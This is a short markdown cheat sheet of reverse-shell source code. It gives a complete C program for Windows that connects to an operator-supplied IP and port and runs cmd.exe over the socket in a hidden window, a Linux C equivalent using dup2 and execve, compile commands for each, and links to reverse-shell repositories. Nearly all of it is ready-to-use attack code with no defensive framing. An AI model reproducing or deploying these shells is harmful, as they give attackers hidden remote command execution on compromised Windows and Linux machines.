# Shells



## C TCP Windows
- compile on Linux: `i686-w64-mingw32-gcc -o WIN_RSH.exe win_rsh.c -lws2_32`

```c
#include <ws2tcpip.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32")
int main(int argc, char *argv[]){
  WSADATA wsaData;
  SOCKET sock;
  struct sockaddr_in server;
  STARTUPINFOA si = { 0 };
  PROCESS_INFORMATION pi;
  if (argc != 4){
  printf("Usage: %s ipv4 port binary\n",argv[0]);
  printf("\tExample 1:%s\v10.0.0.1 1234 cmd.exe\n",argv[0]);
  return EXIT_FAILURE;
}
WSAStartup(MAKEWORD(1, 0), &wsaData);
sock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
server.sin_family = AF_INET;
inet_pton(AF_INET, argv[1], &server.sin_addr.s_addr);
server.sin_port = htons(atoi(argv[2]));
WSAConnect(sock, (const PSOCKADDR)&server, sizeof(server), NULL, NULL, NULL, NULL);
si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
si.wShowWindow = SW_HIDE;
si.cb = sizeof(si);
CreateProcessA(NULL,argv[3],NULL,NULL,TRUE,CREATE_NEW_CONSOLE,NULL,NULL,&si,&pi);
return EXIT_SUCCESS;
}

```


## C TCP Linux:
- compile on Linux: `gcc -o LIN_RSH lin_rsh.c`

```c
#include <stdarg.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
int main(int argc, char **argv) {
  int RP = 0; RP = atoi(argv[1]);
  char *RH  = argv[2];
  char *BIN = argv[3];
  int is = 0; is = socket(AF_INET,SOCK_STREAM,0);
  struct  sockaddr_in s1;
  s1.sin_family      = AF_INET;
  s1.sin_port        = htons(RP);
  s1.sin_addr.s_addr = inet_addr(RH);
  connect( is,(struct sockaddr *) &s1,sizeof(s1));
  for(int i=0;i<3;dup2(is,i),i++);
  char * const A[] = {BIN,NULL};
  execve(BIN,  A, NULL);
  return 0;
}
```

## References
- Inspiration from [EXEC_LKM](https://github.com/loneicewolf/EXEC_LKM)
- [ReverseShells](https://github.com/loneicewolf/ReverseShells)

